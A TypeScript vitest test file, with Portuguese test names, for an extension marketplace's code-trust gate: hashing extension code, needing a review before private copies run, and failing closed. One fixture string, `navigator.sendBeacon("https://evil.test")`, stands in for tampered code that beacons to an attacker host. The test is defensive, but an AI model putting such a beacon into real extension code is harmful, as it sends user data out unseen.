import { describe, expect, it } from 'vitest';
import {
  extensionCodeOf,
  extensionHasCode,
  hashExtensionCode,
  isExtensionCodeTrusted,
} from './extensionCodeTrust';
import { extensionRecordFrom } from './extensionRecordFrom';
import { installedExtensionRecords } from './installedExtensionRecords';
import type { MarketplacePlugin } from '../../entities/MarketplacePlugin';
import type { InstalledExtension } from '../../entities/InstalledExtension';

const pkg = (overrides: Partial<MarketplacePlugin> = {}): MarketplacePlugin =>
  ({
    manifest: { id: 'com.acme.x', version: '1.0.0', kernel: '^2.0.0', name: 'X' },
    summary: '',
    workflows: [],
    ...overrides,
  }) as MarketplacePlugin;

const withCode = pkg({
  views: [{ key: 'painel', title: 'Painel', icon: 'apps', source: 'export default () => null;' }],
} as Partial<MarketplacePlugin>);

const dataOnly = pkg();

const installedFrom = (
  overrides: Partial<InstalledExtension> = {},
): InstalledExtension =>
  ({
    id: 'com.acme.x',
    tenantId: 't1',
    active: true,
    package: withCode,
    source: 'private',
    installedVersion: '1.0.0',
    authorId: 'u1',
    authorName: 'Ana',
    authorPhotoURL: null,
    installedBy: 'u1',
    installedAt: new Date(),
    updatedAt: new Date(),
    ...overrides,
  }) as InstalledExtension;

describe('identificação do código', () => {
  it('pacote só de dados não tem código', () => {
    expect(extensionCodeOf(dataOnly)).toBeNull();
    expect(extensionHasCode(dataOnly)).toBe(false);
  });

  it('startup sozinho já conta como código', () => {
    expect(extensionHasCode(pkg({ startup: 'export default () => {};' }))).toBe(true);
  });

  it('a ordem das views não muda o hash', async () => {
    const a = pkg({ views: [
      { key: 'b', title: 'B', icon: 'apps', source: 'b' },
      { key: 'a', title: 'A', icon: 'apps', source: 'a' },
    ] } as Partial<MarketplacePlugin>);
    const b = pkg({ views: [
      { key: 'a', title: 'A', icon: 'apps', source: 'a' },
      { key: 'b', title: 'B', icon: 'apps', source: 'b' },
    ] } as Partial<MarketplacePlugin>);
    expect(await hashExtensionCode(a)).toBe(await hashExtensionCode(b));
  });

  it('mudar uma linha de código muda o hash', async () => {
    const alterado = pkg({
      views: [{ key: 'painel', title: 'Painel', icon: 'apps', source: 'export default () => 1;' }],
    } as Partial<MarketplacePlugin>);
    expect(await hashExtensionCode(alterado)).not.toBe(await hashExtensionCode(withCode));
  });
});

describe('quem pode executar código', () => {
  it('pacote sem código não é barrado', async () => {
    const extension = installedFrom({ package: dataOnly });
    expect(isExtensionCodeTrusted(extension, null)).toBe(true);
  });

  it('cópia do catálogo público dispensa o gesto', async () => {
    const extension = installedFrom({ source: 'public' });
    expect(isExtensionCodeTrusted(extension, await hashExtensionCode(withCode))).toBe(true);
  });

  it('cópia privada sem revisão NÃO executa', async () => {
    const extension = installedFrom();
    expect(isExtensionCodeTrusted(extension, await hashExtensionCode(withCode))).toBe(false);
  });

  it('cópia privada revisada executa', async () => {
    const hash = (await hashExtensionCode(withCode))!;
    const extension = installedFrom({
      codeTrust: { hash, trustedBy: 'u1', trustedByName: 'Ana', trustedAt: new Date() },
    });
    expect(isExtensionCodeTrusted(extension, hash)).toBe(true);
  });

  it('trocar o código mantendo a versão derruba a confiança', async () => {
    const hashAntigo = (await hashExtensionCode(withCode))!;
    const alterado = pkg({
      views: [{ key: 'painel', title: 'Painel', icon: 'apps', source: 'navigator.sendBeacon("https://evil.test")' }],
    } as Partial<MarketplacePlugin>);
    const extension = installedFrom({
      package: alterado,
      installedVersion: '1.0.0',
      codeTrust: { hash: hashAntigo, trustedBy: 'u1', trustedByName: 'Ana', trustedAt: new Date() },
    });
    expect(isExtensionCodeTrusted(extension, await hashExtensionCode(alterado))).toBe(false);
  });
});

describe('gate no registro do Kernel', () => {
  it('sem confiança, o pacote entra sem implementations', () => {
    const record = extensionRecordFrom(withCode, false);
    expect(record.trusted).toBe(false);
    expect(record.implementations).toBeUndefined();
  });

  it('com confiança, as views viram implementations', () => {
    const record = extensionRecordFrom(withCode, true);
    expect(record.trusted).toBe(true);
    expect(Object.keys(record.implementations ?? {})).toEqual(['painel']);
  });

  it('o padrão é NÃO executar — omitir o argumento falha fechado', () => {
    expect(extensionRecordFrom(withCode).trusted).toBe(false);
  });

  it('conjunto vazio de confiáveis não deixa nada executar', () => {
    const records = installedExtensionRecords([installedFrom()], new Set());
    expect(records[0].trusted).toBe(false);
  });

  it('extensão inativa não entra, confiável ou não', () => {
    const records = installedExtensionRecords(
      [installedFrom({ active: false })],
      new Set(['com.acme.x']),
    );
    expect(records).toEqual([]);
  });
});
